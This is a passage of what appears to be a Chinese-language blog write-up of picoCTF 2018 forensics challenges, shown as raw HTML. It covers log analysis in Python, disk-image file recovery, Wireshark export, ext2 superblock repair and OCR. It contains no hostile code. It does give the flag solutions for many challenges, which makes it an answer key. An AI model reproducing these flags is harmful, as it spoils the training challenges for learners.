</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-38>38</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc 2018shell2.picoctf.com <span style=color:#ae81ff>63299</span>
</span></span><span style=display:flex><span>You<span style=color:#e6db74>&#39;ll need to consult the file `incidents.json` to answer the following questions.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>What is the most common source IP address? If there is more than one IP address that is the most common, you may give any of the most common ones.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>250.226.237.236
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Correct!
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>How many unique destination IP addresses were targeted by the source IP address 193.1.59.100?
</span></span></span><span style=display:flex><span><span style=color:#e6db74>2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Correct!
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>What is the average number of unique destination IP addresses that were sent a file with the same hash? Your answer needs to be correct to 2 decimal places.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>1.43
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Correct!
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Great job. You&#39;</span>ve earned the flag: picoCTF<span style=color:#f92672>{</span>J4y_s0n_d3rUUUULo_23fa6fa6<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/*精确到小数点后两位 <span style=color:#f92672>(</span>1+1+2+1+3+1+1<span style=color:#f92672>)</span>/7<span style=color:#f92672>=</span>1.43
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>import json
</span></span><span style=display:flex><span>j<span style=color:#f92672>=</span>json.load<span style=color:#f92672>(</span>open<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;incidents.json&#39;</span><span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>tickets<span style=color:#f92672>=</span>j<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;tickets&#39;</span><span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>hashes<span style=color:#f92672>=</span>dict<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> t in tickets:
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> t<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;file_hash&#39;</span><span style=color:#f92672>]</span> not in hashes.keys<span style=color:#f92672>()</span>:
</span></span><span style=display:flex><span>		hashes<span style=color:#f92672>[</span>t<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;file_hash&#39;</span><span style=color:#f92672>]]=[</span>t<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;dst_ip&#39;</span><span style=color:#f92672>]]</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>		hashes<span style=color:#f92672>[</span>t<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;file_hash&#39;</span><span style=color:#f92672>]]</span>.append<span style=color:#f92672>(</span>t<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;dst_ip&#39;</span><span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>print hashes
</span></span><span style=display:flex><span><span style=color:#75715e># {</span>
</span></span><span style=display:flex><span><span style=color:#75715e># u&#39;78d8572c143fb161&#39;: [u&#39;90.174.224.210&#39;], </span>
</span></span><span style=display:flex><span><span style=color:#75715e># u&#39;a275ec611d018a67&#39;: [u&#39;94.165.167.88&#39;], </span>
</span></span><span style=display:flex><span><span style=color:#75715e># u&#39;308f80097c708e3d&#39;: [u&#39;90.174.224.210&#39;, u&#39;216.243.24.241&#39;], </span>
</span></span><span style=display:flex><span><span style=color:#75715e># u&#39;27d9b03884d73aaa&#39;: [u&#39;94.165.167.88&#39;], </span>
</span></span><span style=display:flex><span><span style=color:#75715e># u&#39;23420f902d5382e1&#39;: [u&#39;94.165.167.88&#39;, u&#39;16.139.98.188&#39;, u&#39;46.11.226.205&#39;], </span>
</span></span><span style=display:flex><span><span style=color:#75715e># u&#39;ea45791ce3528103&#39;: [u&#39;127.19.170.162&#39;], </span>
</span></span><span style=display:flex><span><span style=color:#75715e># u&#39;729b56eab8ac3252&#39;: [u&#39;94.165.167.88&#39;]}</span>
</span></span><span style=display:flex><span>*/
</span></span></code></pre></td></tr></table></div></div><h2 id=reading-between-the-eyes>Reading Between the Eyes<a hidden class=anchor aria-hidden=true href=#reading-between-the-eyes>#</a></h2><p><img loading=lazy src=a2a4555d5be747283.png alt></p><p><code>picoCTF{r34d1ng_b37w33n_7h3_by73s}</code></p><h2 id=recovering-from-the-snap>Recovering From the Snap<a hidden class=anchor aria-hidden=true href=#recovering-from-the-snap>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-8>8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-9>9</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/桌面/picoctf# file animals.dd
</span></span><span style=display:flex><span>animals.dd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID <span style=color:#e6db74>&#34;mkfs.fat&#34;</span>, sectors/cluster 4, root entries 512, sectors <span style=color:#ae81ff>20480</span> <span style=color:#f92672>(</span>volumes &lt;<span style=color:#f92672>=</span><span style=color:#ae81ff>32</span> MB<span style=color:#f92672>)</span>, Media descriptor 0xf8, sectors/FAT 20, sectors/track 32, heads 64, reserved 0x1, serial number 0x9b664dde, unlabeled, FAT <span style=color:#f92672>(</span><span style=color:#ae81ff>16</span> bit<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>root@kali:~/桌面/picoctf# fdisk -lu animals.dd
</span></span><span style=display:flex><span>Disk animals.dd: <span style=color:#ae81ff>10</span> MiB, <span style=color:#ae81ff>10485760</span> bytes, <span style=color:#ae81ff>20480</span> sectors
</span></span><span style=display:flex><span>Units: sectors of <span style=color:#ae81ff>1</span> * 512 <span style=color:#f92672>=</span> <span style=color:#ae81ff>512</span> bytes
</span></span><span style=display:flex><span>Sector size <span style=color:#f92672>(</span>logical/physical<span style=color:#f92672>)</span>: <span style=color:#ae81ff>512</span> bytes / <span style=color:#ae81ff>512</span> bytes
</span></span><span style=display:flex><span>I/O size <span style=color:#f92672>(</span>minimum/optimal<span style=color:#f92672>)</span>: <span style=color:#ae81ff>512</span> bytes / <span style=color:#ae81ff>512</span> bytes
</span></span><span style=display:flex><span>Disklabel type: dos
</span></span><span style=display:flex><span>Disk identifier: 0x00000000
</span></span></code></pre></td></tr></table></div></div><p>参考 <a href=https://www.bleepingcomputer.com/forums/t/522890/imagedd-file-of-a-corrupted-external-hd-looking-to-mountrecover/>这里</a> ，使用<a href=https://www.osforensics.com/tools/mount-disk-images.html>OSFMount</a> 挂载磁盘，使用 <a href=https://www.cgsecurity.org/wiki/TestDisk_Download>TestDisk & PhotoRec 7.1-WIP, Data Recovery</a> 恢复被删除的<code>theflag.jpg</code> 。</p><p><code>picoCTF{th3_5n4p_happ3n3d}</code></p><p><img loading=lazy src=18b55a97f36e95ae1.png alt></p><h2 id=admin-panel>admin panel<a hidden class=anchor aria-hidden=true href=#admin-panel>#</a></h2><p>用wireshark打开，导出HTTP对象，其中一个文件内容是<code>user=admin&amp;password=picoCTF{n0ts3cur3_df598569}</code> 。</p><h2 id=hex-editor>hex editor<a hidden class=anchor aria-hidden=true href=#hex-editor>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>strings hex_editor.jpg | grep pico
</span></span><span style=display:flex><span>Your flag is: <span style=color:#e6db74>&#34;picoCTF{and_thats_how_u_edit_hex_kittos_8BcA67a2}&#34;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=truly-an-artist>Truly an Artist<a hidden class=anchor aria-hidden=true href=#truly-an-artist>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>strings 2018.png | grep pico
</span></span><span style=display:flex><span>picoCTF<span style=color:#f92672>{</span>look_in_image_9f5be995<span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=now-you-dont>now you don&rsquo;t<a hidden class=anchor aria-hidden=true href=#now-you-dont>#</a></h2><p><img loading=lazy src=425f6117beaccc0d1.png alt></p><p><code>picoCTF{n0w_y0u_533_m3}</code></p><h2 id=ext-super-magic>Ext Super Magic<a hidden class=anchor aria-hidden=true href=#ext-super-magic>#</a></h2><p>根据提示使用debugfs查看img文件，发现幻数损坏。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># debugfs ext.img</span>
</span></span><span style=display:flex><span>debugfs 1.44.4 <span style=color:#f92672>(</span>18-Aug-2018<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>debugfs: Bad magic number in super-block <span style=color:#66d9ef>while</span> trying to open ext.img
</span></span><span style=display:flex><span>.......
</span></span></code></pre></td></tr></table></div></div><p>从文档（<a href=https://wiki.osdev.org/Ext2#Superblock>https://wiki.osdev.org/Ext2#Superblock</a>）可以看到使用ext2文件系统的第一步是寻找、提取、解析superblock。superblock总是从卷的1024字节开始，长度为1024字节。也就是说，如果一个扇区是512字节，那么superblock位于第2、3扇区。而在superblock中，ext2文件的signature（0xef53）位于第56、57两个字节，所以我们要修正文件的magic number为正确的signature，也就是修改(1024+56,1024+57)bytes即(1080,1081)bytes即(0x438,0x439)bytes的值为<code>0xef53</code> 。需注意采用小端序，低字节在低地址。</p><p><img loading=lazy src=472e6e8ad5ba1b229.png alt></p><p>根据文档修改superblock，然后可以mount到系统，发现有个flag图片。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-10>10</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># file fix.img</span>
</span></span><span style=display:flex><span>fix.img: Linux rev 1.0 ext2 filesystem data, UUID<span style=color:#f92672>=</span>a3708ef2-5ec0-4463-9a03-599c890645cd <span style=color:#f92672>(</span>large files<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># xxd ext.img &gt; ext.hex</span>
</span></span><span style=display:flex><span><span style=color:#75715e># xxd fix.img &gt; fix.hex</span>
</span></span><span style=display:flex><span><span style=color:#75715e># diff *.hex</span>
</span></span><span style=display:flex><span>68c68
</span></span><span style=display:flex><span>&lt; 00000430: 34dc ad5b <span style=color:#ae81ff>0100</span> ffff <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0100</span> <span style=color:#ae81ff>0100</span> <span style=color:#ae81ff>0000</span>  4..<span style=color:#f92672>[</span>............
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>&gt; 00000430: 34dc ad5b <span style=color:#ae81ff>0100</span> ffff 53ef <span style=color:#ae81ff>0100</span> <span style=color:#ae81ff>0100</span> <span style=color:#ae81ff>0000</span>  4..<span style=color:#f92672>[</span>....S.......
</span></span><span style=display:flex><span><span style=color:#75715e># mkdir tmpdir &amp;&amp; mount fix.img tmpdir &amp;&amp; ll tmpdir/ | grep flag</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=8981c3e076e504d11.png alt></p><p><img loading=lazy src=f1759e314973bc830.png alt></p><p>尝试了多个命令行OCR工具，tesseract-ocr效果最好，但识别结果还需要修正。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$apt install gocr
</span></span><span style=display:flex><span>$apt install cuneiform
</span></span><span style=display:flex><span>$apt install tesseract-ocr
</span></span><span style=display:flex><span>$tesseract cut_flag.jpg res <span style=color:#f92672>&amp;&amp;</span> cat res.txt
</span></span><span style=display:flex><span>Tesseract Open Source OCR Engine v4.0.0-rc4 with Leptonica
</span></span><span style=display:flex><span>Your flag is: <span style=color:#e6db74>&#34;picoCTF {FDBfbc6141e7F 4bscI90CIaE7SbI63aEf} &#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>最后结果：<code>picoCTF{FDBfbC6141e7F4b8c90C9aE78b963aEf}</code></p><h2 id=lying-out>Lying Out<a hidden class=anchor aria-hidden=true href=#lying-out>#</a></h2><p>根据日常流量图判断流量可能异常的时间点。</p><p><img loading=lazy src=bb6906a0c684da68f.png alt></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-16>16</a>
